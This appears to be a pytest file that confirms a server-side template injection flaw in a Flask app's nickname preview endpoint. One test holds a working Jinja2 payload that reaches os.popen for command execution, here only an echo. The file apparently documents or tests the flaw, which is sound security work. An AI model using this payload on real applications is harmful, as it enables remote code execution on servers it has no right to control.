import pytest


@pytest.fixture
def app():
    from app import create_app, db
    from app.core.models import User
    from werkzeug.security import generate_password_hash

    application = create_app(config_object="config.TestConfig")
    application.config["TESTING"] = True

    with application.app_context():
        db.drop_all()
        db.create_all()
        db.session.add(User(id=1, username="attacker", email="a@test.local",
                             password_hash=generate_password_hash("Password123!"), role="customer"))
        db.session.commit()
        yield application


@pytest.fixture
def client(app):
    return app.test_client()


def _login(client):
    client.post("/login", data={"username": "attacker", "password": "Password123!"})


def test_normal_nickname_renders_unchanged(client):
    _login(client)
    resp = client.post("/notifications/preview", json={"nickname": "John"})
    assert resp.status_code == 200
    assert "Hi John" in resp.get_json()["preview_html"]


def test_ssti_expression_evaluates(client):
    """THE VULNERABILITY. {{7*7}} evaluates to 49 -- confirms code
    execution inside the template, not string interpolation."""
    _login(client)
    resp = client.post("/notifications/preview", json={"nickname": "{{7*7}}"})
    assert resp.status_code == 200
    assert "Hi 49" in resp.get_json()["preview_html"]


def test_ssti_achieves_command_execution(client):
    """Full RCE via standard Jinja2 SSTI technique -- verified
    working against this app's exact Jinja2 version."""
    _login(client)
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo ssti_rce_proof').read() }}"
    resp = client.post("/notifications/preview", json={"nickname": payload})
    assert resp.status_code == 200
    assert "ssti_rce_proof" in resp.get_json()["preview_html"]


def test_requires_login(client):
    resp = client.post("/notifications/preview", json={"nickname": "test"})
    assert resp.status_code == 401
